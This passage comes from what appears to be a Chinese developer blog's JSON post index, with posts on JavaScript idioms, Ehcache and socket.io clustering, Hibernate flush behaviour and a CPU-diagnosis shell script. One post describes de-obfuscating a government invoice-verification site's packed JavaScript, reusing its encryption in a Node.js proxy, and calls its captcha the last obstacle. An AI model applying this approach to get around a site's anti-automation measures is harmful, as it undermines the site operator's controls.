result;\n}\n```\n更为严谨的实现可以查看[es5-shim.js](https://github.com/es-shims/es5-shim/blob/master/es5-shim.js)中对`reduce`的实现\n"},{"title":"slice.call(arguments)","url":"/2018/08/19/[]-slice-call(arguments)原理解析/","content":"`javascirpt`的类数组对象可以像数组一样使用for循环遍历，但是却不能调用数组原型链的方法，为了让类数组对象可以像数组对象一样调用`push`，`pop`等方法，可以将类数组对象转成数组对象：\n### `将类数组对象转换成数组`\n```\nvar args = []; \nvar obj = {0:\"www\",1:\"jianshu\",2:\"com\",length:3};\nfor (var i = 0; i < obj.length; i++) { \n    args.push(obj[i]);\n}\nconsole.log(args);  //[\"www\",\"jianshu\",\"com\"]\n//等价于以下的写法\nconsole.log([].slice.call(obj));  //[\"www\",\"jianshu\",\"com\"]\n```\n理解`[].slice.call(arguments)`的原理，需要明白：\n\n- **slice()方法的作用** \n- **call()方法的作用** \n- **slice()方法的内部实现** \n\n\n### `Array.prototype.slice()`\n```javascript\nconsole.log([1,2,3,4,5].slice(0,1)); //[1]\nconsole.log([1,2,3,4,5].slice(1,3)); //[2,3]\nconsole.log([1,2,3,4,5].slice(3)); //[4,5]\nconsole.log([1,2,3,4,5].slice()); //[1,2,3,4,5]\n```\n数组的`slice(start,end)`方法，返回从`start`开始到`end`的子数组，如果`start`和`end`都没有设置，则返回整个数组，这个过程不影响原数组。\n\n### `Function.prototype.call()`\n```\nfunction func(name, price) {\n  this.name = name;\n  this.price = price;\n}\nvar food = {name:\"apple\",price:10};\nfunc.call(food,\"orange\",15);\nconsole.log(food); // {name: \"orange\", price: 15}\n```\n调用`call`方法传入的参数比原方法多一个参数，简单来说，`call`方法的作用就是：用`call`方法的`第一个参数`代替`func`方法内部的`this`，其他参数为原`func`方法的参数。\n\n### `slice方法内部实现`  \n[slice方法内部实现，V8源码第587行](\nhttps://github.com/v8/v8/blob/ad82a40509c5b5b4680d4299c8f08d6c6d31af3c/src/js/array.js)，其基本原理就类似我们上面开头写的for循环遍历原数组，根据start和end的值再复制一份到新数组并返回。所以当我们使用[].slice.call(arguments)，slice方法内部的this就会被替换成arguments，并循环遍历arguments，复制到新数组返回，这样就得到了一个复制arguments类数组的数组对象。\n\n### `为了提高性能，减少一层对原型链的追溯，一般我们会采用以下的写法`：\n```\nArray.prototype.slice.call(arguments)\n```\n"},{"title":"js-setter-&-getter","url":"/2018/08/19/js-setter-&-getter/","content":"在mvvm框架中，数据双向绑定的底层实现中会用到setter和getter，javascript的中的setter和getter可以实现：\n\n- 当获取对象的属性值时可以触发`get`方法\n- 当为对象的属性赋值时可以触发`set`方法\n\n主要有如下4种实现方式：\n\n### `对象初始化时定义`\n```javascript\nvar obj = {\n    a: 1,\n    get b() {\n        return this.a;\n    },\n    set b(v) {\n        this.a = v;\n    }\n};\nconsole.log(obj.b);\nobj.b = 2;\nconsole.log(obj.b);\n```\n\n### `Object.create`\n```\nvar proto = {a : 1};\nvar obj = Object.create(proto, {\n    b: {\n        get: function () {\n            return this.a;\n        },\n        set: function (v) {\n\t\t\tthis.a = v;\n        }\n    }\n});\nconsole.log(obj.b);\nobj.b = 2;\nconsole.log(obj.b);\n```\n\n### `Object.prototype.__defineGetter__(非标准)`  &&   `Object.prototype.__defineSetter__(非标准)`\n```\nvar obj = { a: 1 };\nobj.__defineGetter__(\"b\", function () {\n\treturn this.a;\n});\nobj.__defineSetter__(\"b\", function (v) {\n\tthis.a = v;\n})\nconsole.log(obj.b);\nobj.b = 2;\nconsole.log(obj.b);\n```\n\n### `Object.defineProperty`\n```\nvar obj = { a: 1 }\nObject.defineProperty(obj, \"b\", {\n    get: function () {\n        return this.a;\n    },\n    set: function (v) {\n        this.a = v;\n    }\n});\nconsole.log(obj.b);\nobj.b = 2;\nconsole.log(obj.b);\n```\n以上示例中\n- obj.b 获取 b 属性值时就会触发 get 方法\n- obj.b = 2 为 b 属性赋值值就会触发 set 方法\n\n在某些业务场景中，用户在文本框输入之后，会触发oninput方法进行校验，标红等。但是如果使用js为input赋值却无法触发这些方法，那么就可以使用setter，getter来实现。\n\n### `js修改input元素的value值时触发set方法`\n```html\n<input id=\"xf\" type=\"text\" name=\"tt\" value=\"1\" />\n<script type=\"text/javascript\">\nvar inputProto = HTMLInputElement.prototype;\nObject.defineProperty(inputProto, \"value\", {\n\tset: function (value) {\n\t\tvar newValue = arguments.length ? value : this.value;\n\t\tvar node = this.attributes.value;\n\t\tif (!node || newValue !== node.value) {\n\t\t\tvar event = document.createEvent(\"Event\");\n\t\t\tevent.initEvent(\"input\", true, true);\n\t\t\tthis.setAttribute(\"value\", newValue);\n\t\t\tthis.style.color = 'red'\n\t\t\tif (document.documentElement.contains(this)) {\n\t\t\t\tthis.dispatchEvent(event);\n\t\t\t}\n\t\t}\n\t}\n});\nxf.oninput = function () {\n\tconsole.log(\"fire event oninput!\");\n}\nxf.value = 2;\n</script>\n\n```\n上诉代码，当使用js修改input元素的value值时，触发set方法，使input的文字变成红色，并且触发oninput事件。\n\n`注意`：\n\n上诉代码只在chrome下测试有效，其他浏览器的兼容方式可自行搜索。\n"},{"title":"Ehcache集群同步","url":"/2018/07/23/Ehcache集群同步/","content":"Ehcache 是一个用Java编写的缓存框架，可以直接集成到Java项目中，与Redis，Memcache等需要另外搭建服务的缓存框架相比，更加轻量，适合集群节点较少的中小型项目。\n\n目前Ehcache主流的集群解决方案主要有`RMI`与`JGROUPS`。\n\n\n- `RMI  基于JAVA JDK的RMI远程访问技术，无需引入第三方依赖，集群配置相对复杂`\n\n- `JGROPUPS  开源的纯JAVA编写的可靠的群组通讯工具，需要第三方jar包依赖，集群配置简单`\n\n假设集群中有A，B两台服务器，ip分别为`192.168.1.1`和`192.168.1.2`\n\n### 服务器A  put值\n```\npublic class Ehcache1 {\n\tpublic static void main(String[] args) {\n\t\tSystem.setProperty(\"java.net.preferIPv4Stack\", \"true\");\n\t\tSystem.setProperty(\"java.net.preferIPv6Addresses\", \"true\");\n\t\tURL url = Ehcache1.class.getClassLoader().getResource(\"ehcache.xml\");\n\t\tCacheManager manager = new CacheManager(url);\n\t\tfinal Cache cache = manager.getCache(\"userCache\");\n\t\tScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(1);\n\t\tscheduledThreadPool.scheduleAtFixedRate(new Runnable() {\n\t\t\tprivate final AtomicLong acl = new AtomicLong(1);\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\tlong value = acl.getAndIncrement();\n\t\t\t\tSystem.out.println(\"正在put,value值:\" + value);\n\t\t\t\tcache.put(new Element(\"key\", value));\n\t\t\t}\n\t\t}, 1, 1, TimeUnit.SECONDS);\n\t}\n}\n```\n服务器A的代码为每隔一秒更新key值累加1\n\n### 服务器B  get值\n```\npublic class Ehcache2 {\n\tpublic static void main(String[] args) {\n\t\tSystem.setProperty(\"java.net.preferIPv4Stack\", \"true\");\n\t\tSystem.setProperty(\"java.net.preferIPv6Addresses\", \"true\");\n\t\tURL url = Ehcache2.class.getClassLoader().getResource(\"ehcache.xml\");\n\t\tCacheManager manager = new CacheManager(url);\n\t\tfinal Cache cache = manager.getCache(\"userCache\");\n\t\tScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(1);\n\t\tscheduledThreadPool.scheduleAtFixedRate(new Runnable() {\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\tSystem.out.println(\"正在获取value:\");\n\t\t\t\tElement element = cache.get(\"key\");\n\t\t\t\tif(element!=null){\n\t\t\t\t\tSystem.out.println(element.getObjectValue());\n\t\t\t\t}\n\t\t\t}\n\t\t}, 1, 1, TimeUnit.SECONDS);\n\t}\n}\n```\n服务器B的代码为每隔一秒获取key的值\n\n如果集群同步成功，那么B服务器就能get到A服务器put的值\n\nRMI和JGROPUPS这两种方案，都分别有`自动发现`和`手动配置`两种模式。自动发现模式下，各个节点会自动去寻找局域网中同网段的节点，每个节点的配置都一样。而手动配置则根据配置文件中的IP去寻找对应的集群节点，每个节点的配置都不同。\n\n### RMI  自动发现\n```\n<ehcache>\n\t<cacheManagerPeerProviderFactory\n\t\tclass=\"net.sf.ehcache.distribution.RMICacheManagerPeerProviderFactory\"\n\t\tproperties=\"peerDiscovery=automatic, \n\t\t\t\t\tmulticastGroupAddress=230.0.0.1,\n\t\t\t    \tmulticastGroupPort=4446, \n\t\t\t    \ttimeToLive=32\" />\n\t<cacheManagerPeerListenerFactory\n\t\tclass=\"net.sf.ehcache.distribution.RMICacheManagerPeerListenerFactory\" />\n\t<cache name=\"userCache\" maxElementsInMemory=\"10\">\n\t\t<cacheEventListenerFactory\n\t\t\tclass=\"net.sf.ehcache.distribution.RMICacheReplicatorFactory\"\n\t\t\tproperties=\"replicateAsynchronously=true, \n\t\t\t\t\t    replicatePuts=true, \n\t\t\t\t\t    replicateUpdates=true,\n\t\t\t\t\t    replicateUpdatesViaCopy=true, \n\t\t\t\t\t    replicateRemovals=true\" />\n\t\t<bootstrapCacheLoaderFactory\n\t\t\tclass=\"net.sf.ehcache.distribution.RMIBootstrapCacheLoaderFactory\"\n\t\t\tproperties=\"bootstrapAsynchronously=true\" />\n\t</cache>\n</ehcache>\n```\n其中`multicastGroupAddress`为组播地址，可以指定 D 类 IP 地址空间，范围从 `224.0.1.0 `到 `238.255.255.255` 中的任何一个地址。自动发现的方式，每个服务器上的配置文件都是一样的，集群中有新增节点或者删除节点的时候，无需改动配置文件。\n\n### RMI  手动配置 A节点\n```\n<ehcache>\n\t<cacheManagerPeerProviderFactory \n        class=\"net.sf.ehcache.distribution.RMICacheManagerPeerProviderFactory\"\n        properties=\"peerDiscovery=manual,rmiUrls=//192.168.1.2:1000/userCache\" />\n    <cacheManagerPeerListenerFactory \n        class=\"net.sf.ehcache.distribution.RMICacheManagerPeerListenerFactory\"\n        properties=\"hostName=192.168.1.1,port=1000,socketTimeoutMillis=2000\" />\n\t<cache name=\"userCache\" maxElementsInMemory=\"10\">\n\t\t<cacheEventListenerFactory\n\t\t\tclass=\"net.sf.ehcache.distribution.RMICacheReplicatorFactory\"\n\t\t\tproperties=\"replicateAsynchronously=true, \n\t\t\t\t\t    replicatePuts=true, \n\t\t\t\t\t    replicateUpdates=true,\n\t\t\t\t\t    replicateUpdatesViaCopy=true, \n\t\t\t\t\t    replicateRemovals=true\" />\n\t\t<bootstrapCacheLoaderFactory\n\t\t\tclass=\"net.sf.ehcache.distribution.RMIBootstrapCacheLoaderFactory\"\n\t\t\tproperties=\"bootstrapAsynchronously=true\" />\n\t</cache>\n</ehcache>\n```\n其中`rmiUrls `中配置其他节点的地址和cache名称，多个节点的时候用`||`分割:\n```\nrmiUrls=//192.168.1.2:1000/userCache||//192.168.1.3:1000/userCache\n```\n`cacheManagerPeerListenerFactory `中配置当前节点的ip和port，不能省略。节点B的配置，只要修改IP即可,其他配置一样：\n```\n <cacheManagerPeerProviderFactory \n        class=\"net.sf.ehcache.distribution.RMICacheManagerPeerProviderFactory\"\n        properties=\"peerDiscovery=manual,rmiUrls=//192.168.1.1:1000/userCache\" />\n <cacheManagerPeerListenerFactory \n        class=\"net.sf.ehcache.distribution.RMICacheManagerPeerListenerFactory\"\n        properties=\"hostName=192.168.1.2,port=1000,socketTimeoutMillis=2000\" />\n```\n手动配置的方式，每个节点的配置都不一样，而且当集群中增加或者删除节点的时候，需要修改配置，较为复杂。不过自动发现的方式在多网卡多IP，虚拟机，禁止组播等环境限制下将会无法使用。\n\n### pom 加载 JGROUPS 依赖\n```\n<dependency>\n\t<groupId>org.jgroups</groupId>\n\t<artifactId>jgroups</artifactId>\n\t<version>3.6.9.Final</version>\n</dependency>\n\n<dependency>\n\t<groupId>net.sf.ehcache</groupId>\n\t<artifactId>ehcache-jgroupsreplication</artifactId>\n\t<version>1.7</version>\n</dependency>\n```\n\n### JGROUPS  自动发现\n```\n<ehcache>\n    <cacheManagerPeerProviderFactory\n        class=\"net.sf.ehcache.distribution.jgroups.JGroupsCacheManagerPeerProviderFactory\"\n        properties=\"connect=UDP(mcast_addr=231.12.21.132;mcast_port=45566;)\"\n        propertySeparator=\"::\" />\n    <cache name=\"userCache\" maxElementsInMemory=\"10000\">\n        <cacheEventListenerFactory\n            class=\"net.sf.ehcache.distribution.jgroups.JGroupsCacheReplicatorFactory\"\n            properties=\"replicateAsynchronously=true,\n                        replicatePuts=true,\n                        replicateUpdates=true,\n                        replicateUpdatesViaCopy=true,\n                        replicateRemovals=true\" />\n        <bootstrapCacheLoaderFactory\n            class=\"net.sf.ehcache.distribution.jgroups.JGroupsBootstrapCacheLoaderFactory\"\n            properties=\"bootstrapAsynchronously=true\" />\n    </cache>\n</ehcache>\n```\nJGROUPS自动发现，采用UDP广播，所有节点的配置均一样。\n\n### JGROUPS  手动配置 A节点\n```\n<ehcache>\n\t<cacheManagerPeerProviderFactory\n\t\tclass=\"net.sf.ehcache.distribution.jgroups.JGroupsCacheManagerPeerProviderFactory\"\n\t\tproperties=\"connect=TCP(bind_addr=192.168.1.1;bind_port=1000):\n\t\t\tTCPPING(initial_hosts=192.168.1.1[1000],192.168.1.2[1000];port_range=1;timeout=5000;num_initial_members=2):\n\t\t\tMERGE2(min_interval=3000;max_interval=5000):\n\t\t\tFD_ALL(interval=5000;timeout=20000):\n\t\t\tFD(timeout=5000;max_tries=48;):\n\t\t\tVERIFY_SUSPECT(timeout=1500):\n\t\t\tpbcast.NAKACK(retransmit_timeout=100,200,300,600,1200,2400,4800;discard_delivered_msgs=true):\n\t\t\tpbcast.STABLE(stability_delay=1000;desired_avg_gossip=20000;max_bytes=0):\n\t\t\tpbcast.GMS(print_local_addr=true;join_timeout=5000)\"\n\t\tpropertySeparator=\"::\" />\n\t<cache name=\"userCache\" maxElementsInMemory=\"10000\">\n\t\t<cacheEventListenerFactory\n\t\t\tclass=\"net.sf.ehcache.distribution.jgroups.JGroupsCacheReplicatorFactory\"\n\t\t\tproperties=\"replicateAsynchronously=true,\n\t\t\t\t\t\treplicatePuts=true,\n\t\t\t\t\t\treplicateUpdates=true,\n\t\t\t\t\t\treplicateUpdatesViaCopy=true,\n\t\t\t\t\t\treplicateRemovals=true\" />\n\t\t<bootstrapCacheLoaderFactory\n\t\t\tclass=\"net.sf.ehcache.distribution.jgroups.JGroupsBootstrapCacheLoaderFactory\"\n\t\t\tproperties=\"bootstrapAsynchronously=true\" />\n\t</cache>\n</ehcache>\n```\n其中`TCPPING(initial_hosts)`配置所有节点的`ip`和`port`信息。每个节点的`bind_addr`和`bind_port`\n需要配置本节点的`ip`和`port`信息，其他配置均一样。另外`bind_addr`和`bind_port`配置不能省略，否则有可能导致同步失败。\n\nB节点中的配置只需要将ip改为如下即可：\n```\n\"connect=TCP(bind_addr=192.168.1.2;bind_port=1000)\"\n```\n\n"},{"title":"js快速获取大图原始宽高","url":"/2018/07/14/js快速获取大图原始宽高/","content":"### 获取图片原始大小常规方式\n```\nvar url = 'http://www.xxx.com/xxx/xxxx.jpg';\nvar img = new Image();\nimg.src = url;\n//如果有缓存\nif(img.complete){\n    console.log(`width:${img.width},height:${img.height}`);\n}else{\n    img.onload = function(){\n        console.log(`width:${img.width},height:${img.height}`);\n    }\n}\n```\n上诉代码，如果要加载的图片非常大的时候，onload事件会等一直等到图片数据全部加载完成才能获取到图片的宽高数据。\n\n\n### 快速获取大图宽高数据\n\n```\nvar url = 'http://www.xxx.com/xxx/xxx.jpg';\nvar img = new Image();\nimg.src = url;\nvar check = function(){\n    if (img.width>0 || img.height>0) {\n        clearInterval(timer);\n        console.log(`width:${img.width},height:${img.height}`);\n    }\n}\nvar timer = setInterval(check,50);\nimg.onload = function(){\n    console.log(`width:${img.width},height:${img.height}`);\n};\n```\n上诉代码加载无缓存的大图时，check方法会先于onload方法获取到图片的宽高数据。这是因为图片含有`图片头`数据和`图片体`数据。`图片头`数据中就包含了图片的宽高，所以当加载完图片头的时候，`img`的`width`和`height`就已经有值了，而不需要等待所有的图片数据都加载完。\n"},{"title":"Broken-pipe-与-Hibernate","url":"/2018/07/13/Broken-pipe-与-Hibernate/","content":"- `broken pipe`\n\n导致broken pipe的原因有很多，不过其根本原因都是：当往socket管道写入数据的时候，管道已经关闭。某次查生产问题的时候，发现日志中有很多booken pipe的错误，都发生在当服务器向客户端返回页面内容的情况下。\n```\njava.io.IOException: Broken pipe\n```\n导致这个错误的主要原因是，当浏览器发起请求，服务端处理时间较长，在服务端还没有返回响应内容的时候，浏览器端就断开了连接（关闭浏览器，删除iframe等）。\n\n- 所以正常情况下出现这个问题，其实并不影响业务的运行\n\n\n- `hibernate set 自动更新`\n\n```\n//执行完之后，数据库中该用户的名称会被修改成newName\nUserDTO user = userDao.findUserByCode(\"userCode\");\nuser.setUserName(\"newName\");\n```\n相信很多人都碰到过这个问题，当对hibernate查询出来的某个实体类进行`set`操作的时候，即使没有调用 `update`方法，这个值也会被更新到数据库中。\n\n不过也不是每次进行`set`操作就一定会被更新到数据库。必须满足`Hibernate session` 的 `FlushMode`为`AUTO `,`COMMIT `,`ALWAYS `状态。如果`FlushMode`为`NEVEL`或者`MANUAL`,那么该 `set`操作就不会被更新到数据库。而spring的`非readOnly事务`则会修改`Hibernate session` 的 `FlushMode`为`AUTO `。\n\n\n假设`spring事务配置`如下：\n```\n<bean id=\"autoproxy\" class=\"org.springframework.aop.framework.autoproxy.BeanNameAutoProxyCreator\"> \n       <property name=\"beanNames\"> \n          <list> \n             <value>*Service</value> \n          </list> \n       </property> \n       <property name=\"interceptorNames\"> \n          <list> \n             <value>transactionInterceptor</value> \n          </list> \n       </property> \n</bean>\n```\n上述配置表示所有以Service结尾的bean都会生成事务代理类\n\n```\n<bean id=\"transactionInterceptor\" class=\"org.springframework.transaction.interceptor.TransactionInterceptor\"> \n        <property name=\"transactionManager\"> \n            <ref bean=\"transactionManager\" /> \n        </property>  \n        <!-- 配置事务属性 --> \n        <property name=\"transactionAttributes\"> \n           <props> \n              <prop key=\"save*\">PROPAGATION_REQUIRED</prop> \n              <prop key=\"find*\">PROPAGATION_REQUIRED,readOnly</prop> \n          </props> \n       </property> \n</bean> \n```\n上述配置表示`find`开头的方法是`readOnly`模式，此时`hibernate session`对应的`FlushMode`为`MANUAL`。`save`开头的方法对应的`FlushMode`为`AUTO `。\n\n- newName会更新到数据库\n```\nUserDTO user = userDao.findUserByCode(\"userCode\");\nuser.setUserName(\"newName\");\nxxxService.saveSomething();\n```\n\n- newName不会更新到数据库\n```\nUserDTO user = userDao.findUserByCode(\"userCode\");\nuser.setUserName(\"newName\");\nxxxService.findSomething();\n```\n\n在使用struts的时候，通常我们会设置异常拦截器：\n```\n<interceptors>\n     <interceptor name=\"ExceptionInterceptor\" class=\"com.xxx.ExceptionInterceptor\">\n     </interceptor>\n</interceptors>\n```\n异常拦截器中除了会有记录日志，发送邮件报警以外，也有把异常信息保存到数据库的情况：\n```\nExceptionService.saveExceptionInfo(e.getMessage());\n```\n那么此时 `hibernate session`的`FlushMode`就会被设置为`AUTO `，导致对DTO的set操作会被保存到数据库。\n\n\n- `总结`\n\n当你在Action中执行hibernate查询操作，并且对查询出来的hibernate实体类进行set操作修改值的时候，如果此时，前端关闭了浏览器，导致服务端抛出broken pipe错误，进入struts异常拦截器，把错误信息记录到数据库，导致将`hibernate session`的`FlushMode` 变成了 `AUTO`，此时`set`的新值就会被更新到数据库，从而导致其他业务问题。\n\n\n"},{"title":"socket-io集群解决方案","url":"/2018/07/01/socket-io集群解决方案/","content":"关于socket.io的群集解决方案，官网中给出了3个示例代码。除了负载均衡的软件不同，其他的代码其实都是一样的，分别为：`nginx`,`httpd`, `haproxy`。以下以nginx为例说明。官网给的demo基于docker，让你可以直接运行。代码结构如下：\n\n![socket.io集群结构](/image/2.webp)\n\n\n- **首先代码`index.js`中加入`redis`适配**\n```\nvar io = require('socket.io')(3000);\nvar redis = require('socket.io-redis');\nio.adapter(redis({ host: 'localhost', port: 6379 }));\n```\n\n除此之外，和单机下的代码并无区别。由于客户端可能连接到集群中不同的节点，为了在集群中不同的节点之间传递消息，socket.io官方以redis的发布订阅功能为基础做了消息路由分发：`socket.io-redis`。`socket.io-redis`在节点向客户端群发消息时会将该消息发布到redis的订阅队列中，让其他节点能够订阅到该消息，从而实现节点间消息推送。\n\n- **`nginx`配置**\n\n```\nworker_processes 4;\nevents {\n  worker_connections 1024;\n}\nhttp {\n  server {\n    listen 80;\n    location / {\n      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n      proxy_set_header Host $host;\n      proxy_pass http://nodes;\n      # enable WebSockets\n      proxy_http_version 1.1;\n      proxy_set_header Upgrade $http_upgrade;\n      proxy_set_header Connection \"upgrade\";\n    }\n  }\n  upstream nodes {\n    # enable sticky session\n    ip_hash;\n    server server-john:3000;\n    server server-paul:3000;\n    server server-george:3000;\n    server server-ringo:3000;\n  }\n}\n```\n该配置文件，在请求头中加入 `Upgrade` 来支持 `websocket` \n使用`ip_hash`保证同一个ip请求到固定的容器。将请求分发给四个服务：`server-john`,`server-paul`,`server-george`,`server-ringo`.\n\n\n\n- **`docker-compose`配置**\n\n```\nnginx:\n  build: ./nginx\n  links:\n    - server-john\n    - server-paul\n    - server-george\n    - server-ringo\n  ports:\n   - \"3000:80\"\n\nserver-john:\n  build: ./server\n  links:\n    - redis\n  expose:\n    - \"3000\"\n  environment:\n    - NAME=John\n\nserver-paul:\n  build: ./server\n  links:\n    - redis\n  expose:\n    - \"3000\"\n  environment:\n    - NAME=Paul\n\nserver-george:\n  build: ./server\n  links:\n    - redis\n  expose:\n    - \"3000\"\n  environment:\n    - NAME=George\n\nserver-ringo:\n  build: ./server\n  links:\n    - redis\n  expose:\n    - \"3000\"\n  environment:\n    - NAME=Ringo\n\nredis:\n  image: redis:alpine\n  expose:\n    - \"6379\"\n```\n\n该配置文件中，nginx依赖四个web服务，每个web服务都依赖redis。每个服务都暴露3000端口。`environment`环境变量用于标示当前的服务器名称，以此来告诉客户端请求被分发到哪台服务器了。会在`index.js`以下的代码中用到。\n\n```\nvar serverName = process.env.NAME || 'Unknown';\n```\n\n- 每个服务的docker配置\n\n```\nFROM mhart/alpine-node:6\n\n# Create app directory\nRUN mkdir -p /usr/src/app\nWORKDIR /usr/src/app\n\n# Install app dependencies\nCOPY package.json /usr/src/app/\nRUN npm install\n\n# Bundle app source\nCOPY . /usr/src/app\n\nEXPOSE 3000\nCMD [ \"npm\", \"start\" ]\n```\n该配置功能：拷贝package.json，安装依赖，拷贝源文件，启动服务。\n\n由于示例采用docker安装，只要你的电脑中有安装docker，当我们下载完官方的代码，直接在代码根目录下运行以下命令便可启动服务进行测试。\n```\n$ docker-compose up -d\n```\n\n- **`注意`**\n\n官网的  `socket.io-redis`库只有在消息广播`(socket.broadcast.emit)`的时候，才能生效。对于私发的消息，如果想在集群不同节点之间传递还是需要自己手动写一个解决方案，具体可以参考redis的发布订阅功能在nodejs下的api。\n"},{"title":"函数防抖和函数节流","url":"/2018/07/01/函数防抖和函数节流/","content":"网页开发中，onmousemove，onkeydown，onscroll，onresize 等事件会频繁的触发绑定函数。为了优化性能，我们会用到函数防抖和函数节流。\n\n### 函数防抖\n\n```\nfunction debounce(fn){\n    var timer = null;\n    return function(){\n        clearTimeout(timer)\n        timer = setTimeout(function(){\n            fn();\n        },500)\n    }\n}\nfunction log(){\n    console.log(1);\n}\ndocument.onmousemove = debounce(log)\n```\n函数防抖，当鼠标移动的时候，不会频繁的触发log方法。而是延迟500毫秒之后，再触发log方法。如果这500毫秒中又来了一次鼠标事件，则直接清除前面的延时任务，重新记时。如果鼠标一直不停的移动，则只有最后一次的鼠标事件会触发log方法。\n\n### 函数节流\n```\nfunction throttle(fn){\n    var start = new Date(); \n    var timer = null;\n    return function(){\n        var now = new Date();\n        clearTimeout(timer);\n        if(now - start > 2000){\n            fn();\n            start = now;\n        }else{\n            timer = setTimeout(function(){\n                fn();\n            },500);\n        }\n    }\n}\nfunction log(){\n    console.log(1);\n}\ndocument.onmousemove = throttle(log)\n```\n 函数节流，和上诉函数防抖的区别在于，当鼠标不停的移动的时候，不会只执行一次log方法。而是每隔2秒就会执行一次log方法。\n"},{"title":"shell脚本排查java进程cpu消耗过高问题","url":"/2018/04/16/shell脚本排查java进程cpu消耗过高问题/","content":"\n关于JVM性能调优监控，网上可以找到很多[排查Java进程cpu消耗过高](https://blog.csdn.net/wisgood/article/details/25343845)的方法，为了方便排查问题的时候不用依次输入众多命令，我们可以将排查命令写入脚本。\n\n- 新建 `monitor.sh`，输入以下脚本:\n\n```bash\n#!/bin/bash\n#找出java的进程ID\njavaId=`pgrep java`\n#找出java进程中最消耗cpu的线程ID\ntopJavaId=`top -b -n 1 -Hp ${javaId}|grep java|head -n 1|awk '{print $1}'`\n#将最耗cpu的java线程ID转换为16进制\ntopJavaId16=`printf \"%x\" ${topJavaId}`\n#定位最耗cpu的线程位置\njstack ${javaId}|grep ${topJavaId16}\n```\n\n当出现java进程消耗cpu过高的时候，在终端下输入 `bash monitor.sh` 运行以上脚本，便可输出java进程最耗cpu的线程堆栈信息。\n\n**注意**：上诉脚本如果是在 windows 下编写并传到 linux 服务器运行的时候，会出现非法字符问题，windows下的回车换行符和 linux下的回车换行符有一定区别，所以最好在 linux 环境下编辑脚本并运行。\n\n**扩展**：以上脚本只是出现问题的时候，手动运行，这时可能cpu已经卡死，导致脚本运行卡顿或者迟迟没有输出结果，所以，更好的做法是，循环定时运行脚本，判断当cpu消耗大于一定比例的时候，自动输出线程堆栈结果，并将定位结果输出到文件中保存。\n"},{"title":"eval(function(p,a,c,k,e,d){}())","url":"/2018/04/14/eval(function(p,a,c,k,e,d){}())/","content":"[![国家税务总局全国增值税发票查验平台](/image/1.webp)](https://inv-veri.chinatax.gov.cn)\n\n前段时间，领导安排了一个poc的演示任务，将上面这个网站的左半部分替换成发票图片列表，点击发票列表中的图片，自动将图片中的信息填充到右侧的表单中，进行查验。\n\n\n打开chrome的F12研究了一下网站的代码，网站所有的JS都是如下的加密形式：\n```javascript\neval(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('1(\"0 2 4 3!\")',5,5,'js|alert|eval|amazing|is'.split('|'),0,{}))\n```\n格式化之后如下:\n```javascript\neval(function(p, a, c, k, e, d) {\n    e = function(c) {\n        return (c < a ? \"\": e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))\n    };\n    if (!''.replace(/^/, String)) {\n        while (c--) d[e(c)] = k[c] || e(c);\n        k = [function(e) {\n            return d[e]\n        }];\n        e = function() {\n            return '\\\\w+'\n        };\n        c = 1;\n    };\n    while (c--) if (k[c]) p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]);\n    return p;\n} ('1(\"0 2 4 3!\")', 5, 5, 'js|alert|eval|amazing|is'.split('|'), 0, {}))\n```\n\neval(function(p, a, c, k, e, d)这几个字符串，是一个常见的js加密混淆之后的输出结果。其中倒数第二第三行的\n\n```javascript\nwhile (c--) if (k[c]) p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]);\n return p;\n```\n就是该函数自带的解密函数，解密方式有很多种:\n\n- 把 eval 改成 document.write\n- 把 eval 改成 console.log\n- 把解密函数中的 return p 改成 document.getElementById(”textareaID”).innerText = p\n\n如果使用第一个方法，会遇到一个坑，当待解密的js中含有 < (小于号) 或者 > (大于号)的时候，会被解析成html的标签元素，导致解析失败，一个解决方案就是在头尾加入xmp元素标签：\n\n```\ndocument.write(\"<xmp>\");\n/*eval*/  document.write(function(p,a,c,k,e,d){...}(...));\ndocument.write(\"</xmp>\");\n```\n\n不过最简单的方案当然还是在线解析了：http://tool.chinaz.com/js.aspx\n\n衍生话题：\n\n- 该网站的数据获取和提交也有许多加密方式，不过都是采用跨域的方式，所以可以直接在页面发起ajax请求和提交数据，不需要经过自己的服务端包装数据再转发到原提交网站。直接保存网站源代码稍作修改就可以使用，其中一个注意点就是该网站的查验结果是在iframe中显示，会存在跨域iframe操作问题，需要自己手动创建一个http服务器来解决该问题。\n\n- 如果不是html页面端发送这些数据，例如安卓和IOS应用发送未加密的发票数据到\n服务端的时候，我们需要在自己的服务端，将这些提交参数，加密成和原网站一样的加密数据之后，再转发到原提交网站。这时候服务端采用nodejs会极其方便，原网站html源码中的加密js方法都可以原封不动的挪用到后端直接使用，无需做不同语言之间的翻译过程。这可能也是用nodejs做爬虫的一大优势。\n\n- 图片识别的部分，现在有很多现成的OCR可以用。\n\n- 最后一个难点就是验证码识别了，该网站的验证码有很多反机器识别干扰，识别起来比较复杂。\n"},{"title":"OpenSessionInViewFilter源码浅析","url":"/2017/07/09/OpenSessionInViewFilter源码浅析/","content":"使用hibernate和spring的项目大部分都有可能会用到OpenSessionInViewFilter和Transactioninterceptor。OpenSessionInViewFilter的主要目的是为了解决hibernate在view层的进行懒加载的时候会遇到session被close的问题。Transactioninterceptor事务拦截器为spring的声明式事务，方便开启和提交事务，不用每次都手动编写hibernate事务相关代码。\n\n先看OpenSessionInViewFilter，在web.xml中的filter配置如下：\n### 